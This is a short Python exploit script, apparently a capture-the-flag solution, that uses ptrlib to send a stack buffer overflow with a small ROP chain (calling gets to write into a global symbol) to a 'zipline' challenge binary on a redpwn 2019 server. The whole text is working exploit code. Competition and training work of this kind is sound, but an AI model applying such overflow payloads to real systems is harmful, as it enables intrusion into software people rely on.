from ptrlib import *

#sock = Process("./zipline")
sock = Socket("chall2.2019.redpwn.net", 4005)
elf = ELF("./zipline")

rop_pop_ebx = 0x08049021
plt_gets = 0x08049060

payload = b'A' * 0x16
payload += p32(plt_gets)
payload += p32(0x8049569)
payload += p32(elf.symbol("a"))
sock.sendlineafter("hell?", payload)

sock.sendline("A" * 0x8)

sock.interactive()
